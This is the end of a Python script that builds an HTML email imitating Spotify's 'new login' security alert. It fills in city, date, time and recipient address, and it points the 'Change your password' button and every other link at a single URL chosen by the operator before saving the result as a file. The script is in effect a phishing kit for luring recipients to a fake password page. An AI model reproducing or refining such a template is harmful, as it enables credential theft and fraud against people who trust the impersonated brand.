	<h2 style="border: none; margin: 0px; padding: 7px 0px 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 17px; line-height: 23px; text-align: center;" align="center">We noticed a new login on your account, Here's the information:</h2>
	</td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 16px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 16px;" colspan="3" valign="middle" height="16">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left"><strong style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-align: left; text-decoration: none; font-weight: bold;">Place/City/Country:</strong> {} {}</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left"><strong style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-align: left; text-decoration: none; font-weight: bold;">Time:</strong> {} {}. 2021 {} CET</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">If you have signed in too your account lately you don't need to do anything right now.</td>
	</tr>
	</tbody>
	</table>
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">If you don't recognize this login we recommend that you immediately <a style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; color: #1ed760;" href="{}" target="_blank" rel="noopener">Change your password</a> to keep you account safe.</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<table style="margin: 0px; padding: 0px;" border="0" width="100%" cellspacing="0" cellpadding="0">
	<tbody>
	<tr>
	<td style="border: none; margin: 0px; padding: 0px 0px 5px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-align: left; text-decoration: none; letter-spacing: 0.15px; color: #181818; font-size: 14px; line-height: 20px;" align="left">Spotify-team</td>
	</tr>
	</tbody>
	</table>
	</td>
	<td style="width: 6.25%; border: none; margin: 0px; padding: 0px;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 20px;" colspan="3" valign="middle" height="20">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; width: 100%;" width="100%" cellspacing="0" cellpadding="0">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 22px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 22px;" colspan="3" valign="middle" height="22">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	<table dir="ltr" style="border: none; margin: 0px; border-collapse: collapse; padding: 0px; background-color: #f7f7f7; width: 100%;" width="100%" cellspacing="0" cellpadding="0" bgcolor="#F7F7F7">
	<tbody style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<tr style="border: none; margin: 0px; padding: 0px; height: 25px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><img style="border: none; margin: 0px; padding: 0px; display: block; max-width: 100%; width: 77px; height: 23px;" src="https://message-editor.scdn.co/newsletter/images/logo_footer.png" alt="" width="77" height="23" /></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 25px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><hr style="border: none; margin: 0px; padding: 0px; background-color: #d1d5d9; height: 1px;" /></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 12px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 12px;" colspan="3" valign="middle" height="12">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; font-size: 11px; line-height: 1.65em; text-align: initial;" align="initial" valign="middle">Get Spotify for <a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">iPhone</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">iPad</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Android</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Other</a></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 12px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 12px;" colspan="3" valign="middle" height="12">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px;" valign="middle"><hr style="border: none; margin: 0px; padding: 0px; background-color: #d1d5d9; height: 1px;" /></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 25px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; font-size: 11px; line-height: 1.65em; text-align: initial;" align="initial" valign="middle">This message was sent to: <a href="mailto:{}" target="_blank" rel="noopener">{}</a>. If you got any questions or complains you can just<a style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; text-align: left; color: #6d6d6d; text-decoration: none; font-weight: bold;" href="{}" target="_blank" rel="noopener">Contact us</a>.</td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 33px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 33px;" colspan="3" valign="middle" height="33">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; line-height: 1.65em; text-align: initial; font-size: 11px;" align="initial" valign="middle"><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Terms</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Privacy Policy</a><span style="border-top: none; border-bottom: none; padding: 0px; width: 1px; border-left: 1px solid #c3c3c3; border-right: 1px solid transparent; display: inline-block; margin: 0px 7px;">&nbsp;</span><a style="border: none; margin: 0px; padding: 0px; text-decoration: none; display: inline-block; color: #6d6d6d; font-weight: bold;" href="{}" target="_blank" rel="noopener">Contact us</a></td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 12px;" colspan="3" valign="middle" height="12">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	<td style="border: none; margin: 0px; padding: 0px; font-family: Circular,'Helvetica Neue',Helvetica,Arial,sans-serif; font-weight: 400; text-decoration: none; letter-spacing: 0.15px; color: #88898c; line-height: 1.65em; text-align: initial; font-size: 11px;" align="initial" valign="middle">Spotify AB, Regeringsgatan 19, 111 53, Stockholm, Sweden</td>
	<td style="border: none; margin: 0px; padding: 0px; width: 6.25%;" valign="middle" width="6.25%">&nbsp;</td>
	</tr>
	<tr style="border: none; margin: 0px; padding: 0px; height: 20px;" valign="middle">
	<td style="border: none; margin: 0px; padding: 0px; height: 25px;" colspan="3" valign="middle" height="25">&nbsp;</td>
	</tr>
	</tbody>
	</table>
	</div>
	</center></td>
	</tr>
	</tbody>
	</table>
	<img style="height: 1px!important; width: 1px!important; border-width: 0!important; padding: 0!important; margin: 0!important;" src="https://wl.spotify.com/wf/open?upn=0dpejNnY-2BgnqNzu3QRLRQuYj-2FzVuoEfQZ-2FSq0xVDBdH7AxMPxte3HbMMrKoo2I2-2BMnKxsdIrz8NwnqWToXdYwmCHhKjbjW0yWYWuzpAfG2qjulQDDmEk-2Fbul2blqHURVftXBSW260JtpF2-2BMMh4aPge86DEa1jbCyO5AZTwvn7mnX-2Fh3v8zUGr5oFY2rXhYjDek0qGHK6RN0ruSPaltVdW5PtL7TG3DqkgxyvomFbmv5siHjTCFi0PVocOniz4yj9dQsrXGrAUJhHv-2BG-2BDndygDRdrBCpfOp0bebivpjp7AmBoCRSMGHgZKgF3XfXURNRaYeqp2gzD0jTY73dnOBOF4fI81XTjFfoCYYynez0jo-3D" alt="" width="1" height="1" border="0" /></div>""".format(Url, City, Country, Date, month, Time, Url, Url, Url, Url, Url, Email, Email, Url, Url, Url, Url,))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

